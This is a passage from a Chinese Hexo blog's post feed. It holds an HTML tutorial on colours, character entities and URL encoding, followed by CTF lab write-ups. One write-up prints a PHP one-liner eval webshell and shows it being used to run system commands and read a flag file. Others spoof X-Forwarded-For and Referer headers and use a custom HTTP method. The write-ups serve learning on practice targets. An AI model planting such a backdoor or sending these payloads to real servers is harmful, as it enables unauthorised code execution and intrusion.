src="https://cdn.jsdelivr.net/gh/S1gma0/image/image-20220129142700462.png"></p><p>PS：此部分颜色为部分截图，完整来源<a href="https://www.runoob.com/html/html-colors.html">https://www.runoob.com/html/html-colors.html</a></p><h3 id="灰暗色调"><a href="#灰暗色调" class="headerlink" title="灰暗色调"></a>灰暗色调</h3><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/image-20220129142847373.png"></p><p>PS：此部分颜色为部分截图，完整来源<a href="https://www.runoob.com/html/html-colors.html">https://www.runoob.com/html/html-colors.html</a></p><h1 id="字符实体"><a href="#字符实体" class="headerlink" title="字符实体"></a>字符实体</h1><p>HTML 中的预留字符必须被替换为字符实体，一些在键盘上找不到的字符也可以使用字符实体来替换。</p><h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>在 HTML 中，某些字符是预留的。</p><p>在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。如需显示小于号，我们必须这样写：<code>&amp;lt; </code>或 <code>&amp;#60;</code> 或 <code>&amp;#060;</code></p><p>如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。</p><h2 id="不间断空格"><a href="#不间断空格" class="headerlink" title="不间断空格"></a>不间断空格</h2><p>HTML 中的常用字符实体是不间断空格(<code>&amp;nbsp;</code>)。</p><p>浏览器总是会截短 HTML 页面中的空格。如果您在文本中写 10 个空格，在显示该页面之前，浏览器会删除它们中的 9 个。如需要页面中增加空格的数量，应使用 <code>&amp;nbsp; </code>字符实体。</p><h2 id="音标符"><a href="#音标符" class="headerlink" title="音标符"></a>音标符</h2><p>发音符号是加到字母上的一个”glyph(字形)”。</p><p>一些变音符号, 如 尖音符 (  ̀) 和 抑音符 (  ́) 。</p><p>变音符号可以出现字母的上面和下面，或者字母里面，或者两个字母间。</p><p>变音符号可以与字母、数字字符的组合来使用。</p><table><thead><tr><th align="center">音标符</th><th align="center">字符</th><th align="center">Construct</th><th align="center">输出结果</th></tr></thead><tbody><tr><td align="center">̀</td><td align="center">a</td><td align="center"><code>a&amp;#768;</code></td><td align="center">à</td></tr><tr><td align="center">́</td><td align="center">a</td><td align="center"><code>a&amp;#769;</code></td><td align="center">á</td></tr><tr><td align="center">̂</td><td align="center">a</td><td align="center"><code>a&amp;#770;</code></td><td align="center">â</td></tr><tr><td align="center">̃</td><td align="center">a</td><td align="center"><code>a&amp;#771;</code></td><td align="center">ã</td></tr><tr><td align="center">̀</td><td align="center">O</td><td align="center"><code>O&amp;#768;</code></td><td align="center">Ò</td></tr><tr><td align="center">́</td><td align="center">O</td><td align="center"><code>O&amp;#769;</code></td><td align="center">Ó</td></tr><tr><td align="center">̂</td><td align="center">O</td><td align="center"><code>O&amp;#770;</code></td><td align="center">Ô</td></tr><tr><td align="center">̃</td><td align="center">O</td><td align="center"><code>O&amp;#771;</code></td><td align="center">Õ</td></tr></tbody></table><h2 id="字符实体表"><a href="#字符实体表" class="headerlink" title="字符实体表"></a>字符实体表</h2><table><thead><tr><th align="center"><strong>显示结果</strong></th><th align="center"><strong>描述</strong></th><th align="center"><strong>实体名称</strong></th><th align="center"><strong>实体编号</strong></th></tr></thead><tbody><tr><td align="center"></td><td align="center">空格</td><td align="center"><code>&amp;nbsp;</code></td><td align="center"><code>&amp;#160;</code></td></tr><tr><td align="center">&lt;</td><td align="center">小于号</td><td align="center"><code>&amp;lt;</code></td><td align="center"><code>&amp;#60;</code></td></tr><tr><td align="center">&gt;</td><td align="center">大于号</td><td align="center"><code>&amp;gt;</code></td><td align="center"><code>&amp;#62;</code></td></tr><tr><td align="center">&amp;</td><td align="center">和号</td><td align="center"><code>&amp;amp;</code></td><td align="center"><code>&amp;#38;</code></td></tr><tr><td align="center">“</td><td align="center">引号</td><td align="center"><code>&amp;quot;</code></td><td align="center"><code>&amp;#34;</code></td></tr><tr><td align="center">‘</td><td align="center">撇号</td><td align="center"><code>&amp;apos; </code>(IE不支持)</td><td align="center"><code>&amp;#39;</code></td></tr><tr><td align="center">￠</td><td align="center">分</td><td align="center"><code>&amp;cent;</code></td><td align="center"><code>&amp;#162;</code></td></tr><tr><td align="center">£</td><td align="center">镑</td><td align="center"><code>&amp;pound;</code></td><td align="center"><code>&amp;#163;</code></td></tr><tr><td align="center">¥</td><td align="center">人民币/日元</td><td align="center"><code>&amp;yen;</code></td><td align="center"><code>&amp;#165;</code></td></tr><tr><td align="center">€</td><td align="center">欧元</td><td align="center"><code>&amp;euro;</code></td><td align="center"><code>&amp;#8364;</code></td></tr><tr><td align="center">§</td><td align="center">小节</td><td align="center"><code>&amp;sect;</code></td><td align="center"><code>&amp;#167;</code></td></tr><tr><td align="center">©</td><td align="center">版权</td><td align="center"><code>&amp;copy;</code></td><td align="center"><code>&amp;#169;</code></td></tr><tr><td align="center">®</td><td align="center">注册商标</td><td align="center"><code>&amp;reg;</code></td><td align="center"><code>&amp;#174;</code></td></tr><tr><td align="center">™</td><td align="center">商标</td><td align="center"><code>&amp;trade;</code></td><td align="center"><code>&amp;#8482;</code></td></tr><tr><td align="center">×</td><td align="center">乘号</td><td align="center"><code>&amp;times;</code></td><td align="center"><code>&amp;#215;</code></td></tr><tr><td align="center">÷</td><td align="center">除号</td><td align="center"><code>&amp;divide;</code></td><td align="center"><code>&amp;#247;</code></td></tr></tbody></table><h1 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h1><p>URL(uniform resource locator)，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。</p><p>采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。</p><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p>URL一般由三部组成：<br>①协议(或称为服务方式)<br>②存有该资源的主机IP地址(有时也包括端口号)<br>③主机资源的具体地址。如目录和文件名等</p><p><code>scheme://host.domain:port/path/filename</code></p><p>scheme - 定义因特网服务的类型。最常见的类型是 http<br>host - 定义域主机（http 的默认主机是 www）<br>domain - 定义因特网域名，比如 runoob.com<br>:port - 定义主机上的端口号（http 的默认端口号是 80）<br>path - 定义服务器上的路径（如果省略，则文档必须位于网站的根目录中）。<br>filename - 定义文档/资源的名称</p><p>例如<code>https://XXXX.github.io/category/CTF/index.php?boardID=5&amp;ID=24618&amp;page=1#anchor</code></p><p>一个完整的URL包括以下几个部分：<br>①<strong>协议</strong>：在internet中可以使用很多协议，http、https、file、mailto、ftp。该URL的使用的是”https“协议。</p><p>②<strong>域名</strong>：该URL的域名是XXXX.github.io</p><p>③<strong>端口</strong>：跟在域名后面的是端口，域名和端口之间用”:“作为分隔符。端口不是一个URL必须要有的部分，如果省略端口，将采用默认端口。该URL省略了端口，采用了默认的端口。</p><p>④<strong>虚拟目录</strong>：在域名后的第一个”/“和最后一个”/“之间的部分是虚拟目录。虚拟目录也不是一个URL必须要有的部分。本URL的虚拟目录为/category/CTF/</p><p>⑤<strong>文件名</strong>：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.php”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名.</p><p>⑥<strong>锚</strong>：从“#”开始到最后，都是锚部分。该URL中的锚是“anchor”。锚部分也不是一个URL必须的部分</p><p>⑦<strong>参数</strong>：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。该URL中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。</p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>URL 只能使用 ASCII 字符集。由于 URL 常常会包含 ASCII 集合之外的字符，URL 必须转换为有效的 ASCII 格式。URL 编码使用 “%” 其后跟随两位的十六进制数来替换非 ASCII 字符。</p><p>URL 不能包含空格，因此URL 编码通常使用 + 来替换空格。</p><p>​                                                                                            <strong>URL编码实例</strong></p><table><thead><tr><th align="center">字符</th><th align="center">URL 编码</th></tr></thead><tbody><tr><td align="center">€</td><td align="center"><code>%80</code></td></tr><tr><td align="center">£</td><td align="center"><code> %A3</code></td></tr><tr><td align="center">©</td><td align="center"><code> %A9</code></td></tr><tr><td align="center">®</td><td align="center"><code>%AE</code></td></tr><tr><td align="center">À</td><td align="center"><code> %C0</code></td></tr><tr><td align="center">Á</td><td align="center"><code>%C1</code></td></tr><tr><td align="center">Â</td><td align="center"><code>%C2</code></td></tr><tr><td align="center">Ã</td><td align="center"><code>%C3</code></td></tr><tr><td align="center">Ä</td><td align="center"><code>%C4</code></td></tr><tr><td align="center">Å</td><td align="center"><code>%C5</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/12/18/hello-world/"/>
      <url>/2021/12/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> nothing </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webshell</title>
      <link href="/2021/12/12/webshell/"/>
      <url>/2021/12/12/webshell/</url>
      
        <content type="html"><![CDATA[<h1 id="题目及分析"><a href="#题目及分析" class="headerlink" title="题目及分析"></a>题目及分析</h1><p>小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。</p><p>打开后出现</p><p><strong>你会使用webshell吗？</strong></p><p><code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code></p><p>这个明显是一句话木马。</p><p>eval()将括号里的字符串按照PHP代码来执行。</p><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>了解一句话木马，学会使用webshell</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>中国蚁剑或hackbar</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="中国蚁剑解决"><a href="#中国蚁剑解决" class="headerlink" title="中国蚁剑解决"></a>中国蚁剑解决</h2><p><strong>1.首先添加数据</strong></p><p>将URL地址粘贴进去，连接密码为shell，然后测试连接。不出意外的话，就能连接成功。连接成功后，点击添加。</p><p><strong>2.进入网站目录寻找flag</strong></p><p>在/var/www/html/中发现flag.txt，打开后得到cyberpeace{5d017cac216724ffba8b9c7f2ee1c366}</p><h2 id="hackbar解决"><a href="#hackbar解决" class="headerlink" title="hackbar解决"></a>hackbar解决</h2><p><strong>1.POST方式传递参数</strong></p><p>在hackbar中将shell=system(“ls”);使用post方式上传上去，然后服务器执行ls命令，将当前工作目录的内容列出。</p><p>flag.txt index.php被列出。</p><p><strong>2.打开flag.txt</strong></p><p>然后在hackbar中将<code>shell=system(&quot;cat flag.txt&quot;);</code>以post方式上传上去，得到<code>cyberpeace&#123;5d017cac216724ffba8b9c7f2ee1c366&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> WriteUp </tag>
            
            <tag> adworld </tag>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xff_referer</title>
      <link href="/2021/12/09/xff-referer/"/>
      <url>/2021/12/09/xff-referer/</url>
      
        <content type="html"><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>X老师告诉小宁其实xff和referer是可以伪造的。</p><p>打开场景，得到提示”ip地址必须为123.123.123.123“</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>使用burpsuite抓包，报文如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 111.200.241.244:53941</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将报文发至重发器，伪造xff</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">X-Forwarded-For: 123.123.123.123</span><br><span class="line">Host: 111.200.241.244:53941</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到响应包如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 09 Dec 2021 13:06:54 GMT</span><br><span class="line">Server: Apache/2.4.7 (Ubuntu)</span><br><span class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.26</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 525</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;index&lt;/title&gt;</span><br><span class="line">    &lt;link href=&quot;http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; /&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body&#123;</span><br><span class="line">            margin-left:auto;</span><br><span class="line">            margin-right:auto;</span><br><span class="line">            margin-TOP:200PX;</span><br><span class="line">            width:20em;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p id=&quot;demo&quot;&gt;ip地址必须为123.123.123.123&lt;/p&gt;</span><br><span class="line">&lt;script&gt;document.getElementById(&quot;demo&quot;).innerHTML=&quot;必须来自https://www.google.com&quot;;&lt;/script&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着根据”必须来自<a href="https://www.google.com&quot;伪造http来源地址./">https://www.google.com&quot;伪造HTTP来源地址。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">referer: https://www.google.com</span><br><span class="line">X-Forwarded-For: 123.123.123.123</span><br><span class="line">Host: 111.200.241.244:53941</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到含flag的响应包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 09 Dec 2021 13:13:25 GMT</span><br><span class="line">Server: Apache/2.4.7 (Ubuntu)</span><br><span class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.26</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 631</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;index&lt;/title&gt;</span><br><span class="line">    &lt;link href=&quot;http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; /&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body&#123;</span><br><span class="line">            margin-left:auto;</span><br><span class="line">            margin-right:auto;</span><br><span class="line">            margin-TOP:200PX;</span><br><span class="line">            width:20em;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p id=&quot;demo&quot;&gt;ip地址必须为123.123.123.123&lt;/p&gt;</span><br><span class="line">&lt;script&gt;document.getElementById(&quot;demo&quot;).innerHTML=&quot;必须来自https://www.google.com&quot;;&lt;/script&gt;&lt;script&gt;document.getElementById(&quot;demo&quot;).innerHTML=&quot;cyberpeace&#123;5dcd02fae972af4a95f448a08f699d1b&#125;&quot;;&lt;/script&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> WriteUp </tag>
            
            <tag> adworld </tag>
            
            <tag> XFF </tag>
            
            <tag> referer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>get&amp;post</title>
      <link href="/2021/12/05/wp&amp;get&amp;post/"/>
      <url>/2021/12/05/wp&amp;get&amp;post/</url>
      
        <content type="html"><![CDATA[<p>CTFHub_Write_Up</p><p>Web前置技能——HTTP协议——请求方式</p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>点击所给链接，下列代码显示在页面上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP Method is GET</span><br><span class="line"></span><br><span class="line">Use CTF**B Method, I will give you flag.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php.</span><br></pre></td></tr></table></figure><p>说明本题需要用GET方式请求index.php,而且要用CTF**B Method</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>如果使用get方式的话，的不到flag，响应包如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: openresty/1.19.3.2</span><br><span class="line">Date: Sun, 05 Dec 2021 13:56:21 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/5.6.40</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Headers: X-Requested-With</span><br><span class="line">Access-Control-Allow-Methods: *</span><br><span class="line">Content-Length: 297</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;/&gt;</span><br><span class="line">    &lt;title&gt;CTFHub HTTP Method&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;HTTP Method is GET&lt;/p&gt;&lt;p&gt;Use CTF**B Method, I will give you flag.&lt;/p&gt;&lt;br/&gt;&lt;p&gt;Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>那就将get方式改成CTFHUB方式，响应包如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: openresty/1.19.3.2</span><br><span class="line">Date: Sun, 05 Dec 2021 13:59:19 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/5.6.40</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Headers: X-Requested-With</span><br><span class="line">Access-Control-Allow-Methods: *</span><br><span class="line">Content-Length: 172</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;/&gt;</span><br><span class="line">    &lt;title&gt;CTFHub HTTP Method&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">good job! ctfhub&#123;1f1619b5de362b0f7e6a3820&#125;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>拿到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> HTTP协议 </tag>
            
            <tag> 请求方式 </tag>
            
            <tag> WriteUp </tag>
            
            <tag> CTFHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GET&amp;POST请求</title>
      <link href="/2021/12/05/get%E5%92%8Cpost%E8%AF%B7%E6%B1%82/"/>
      <url>/2021/12/05/get%E5%92%8Cpost%E8%AF%B7%E6%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h1><p>使用GET方式提交一个名为a，值为1的变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?a=1 HTTP/1.1</span><br></pre></td></tr></table></figure><h1 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h1><p>使用POST方式提交一个名为b，值为2的变量。</p><p>将请求方式改为POST，然后将下列代码写在最后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>然后<strong>空一行</strong>输入需要提交的变量</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">b=2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> HTTP协议 </tag>
            
            <tag> 请求方式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知识杂记</title>
      <link href="/2021/12/05/%E7%9F%A5%E8%AF%86%E6%9D%82%E8%AE%B0/"/>
      <url>/2021/12/05/%E7%9F%A5%E8%AF%86%E6%9D%82%E8%AE%B0/</url>
      
